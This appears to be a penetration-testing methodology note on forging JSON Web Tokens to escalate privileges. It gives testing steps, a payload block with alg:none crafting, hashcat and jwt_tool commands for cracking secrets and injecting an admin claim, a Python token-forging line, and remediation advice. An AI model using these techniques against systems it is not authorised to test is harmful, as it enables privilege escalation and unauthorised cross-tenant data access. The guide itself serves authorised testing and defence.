# JWT Role / Claim Manipulation

## Overview
JSON Web Tokens (JWTs) encode claims about a user — including their role, permissions, and identity — in a base64-encoded payload. If the server does not properly validate the token signature, or if signature verification is bypassable, an attacker can modify the payload to escalate privileges by changing role claims like `"role": "user"` to `"role": "admin"`.

## How It Works
- The JWT payload is base64url-encoded — not encrypted. Any user can decode and read it.
- If the server fails to verify the signature (e.g., due to `alg:none` attack or weak secret), payload tampering is trivially exploitable.
- Even with a properly signed token, `kid` header injection, algorithm confusion (RS256→HS256), or key confusion attacks can allow forging tokens.
- Roles and permissions should always be resolved server-side from the database using the `sub` claim — never trusted from the token payload directly.

## Impact
- Privilege escalation from regular user to administrator.
- Access to admin endpoints, dashboards, and operations.
- Cross-tenant data access by modifying `tenantId` or `orgId` claims.
- Bypassing feature gates controlled by token claims.

## Where to Look
- JWT tokens in `Authorization: Bearer` headers, cookies, localStorage.
- Decode any JWT you receive: header.payload.signature are base64url parts split by `.`.
- Look for role-related claims: `role`, `roles`, `permissions`, `scope`, `isAdmin`, `admin`, `groups`.
- Multi-tenant apps: `tenantId`, `orgId`, `companyId` claims that scope data access.

## Testing Steps
1. Capture a JWT from any authenticated request.
2. Decode the payload: `echo "<payload_part>" | base64 -d | python3 -m json.tool`.
3. Identify role/permission claims in the payload.
4. Try the `alg:none` attack: change `"alg"` to `"none"` in the header, modify the payload claim, remove the signature.
5. If the secret appears weak, try brute-forcing it with `hashcat` or `jwt_tool`.
6. Modify the role claim (e.g., `user` → `admin`) and re-sign with the cracked secret.
7. Try RS256 → HS256 confusion: sign with the server's public key as the HMAC secret.
8. Submit the modified token and observe if server accepts it and grants elevated access.

## Payloads / Techniques
```bash
# Decode JWT payload
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ" | base64 -d
# Output: {"sub":"1234567890","role":"user"}

# Craft alg:none token (no signature needed)
# Header: {"alg":"none","typ":"JWT"} → base64url
# Payload: {"sub":"123","role":"admin"} → base64url
# Combine: <header>.<payload>.   (empty signature)

# Brute-force weak secret
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# jwt_tool for all attacks
python3 jwt_tool.py <token> -X a         # alg:none
python3 jwt_tool.py <token> -X n         # null signature
python3 jwt_tool.py <token> -I -pc role -pv admin  # inject claim
python3 jwt_tool.py <token> -pk public.pem -X k  # RS256→HS256 confusion

# Manual token construction (Python)
import jwt
forged = jwt.encode({"sub": "user123", "role": "admin"}, "secret123", algorithm="HS256")
```

## Burp Suite Tips
- **JSON Web Tokens** (JWT Editor) extension in BApp Store — visually edit and resign JWTs.
- Use the **"Attack"** tab in JWT Editor to try alg:none, blank password, and embedded JWK attacks automatically.
- In **Repeater**, right-click the Authorization header value → "Sent to JWT Editor" for quick editing.
- **Logger++** to capture every JWT and compare claims across user roles.

## Tools
- jwt_tool — https://github.com/ticarpi/jwt_tool (comprehensive JWT attack toolkit)
- Burp JWT Editor extension
- hashcat (mode 16500 for JWT HS256 cracking)
- john the ripper (--wordlist mode on JWT)
- CyberChef — for base64url encoding/decoding

## Remediation
- Always verify the JWT signature on the server with a strong secret (≥256 bits for HS256) or asymmetric key.
- Reject tokens with `alg: none` or unexpected algorithms.
- Resolve roles and permissions from the database using the `sub` claim — do not trust payload claims for access decisions.
- Set short expiry times and rotate signing keys regularly.
- Use a well-tested JWT library and keep it updated.

## References
https://portswigger.net/web-security/jwt
https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
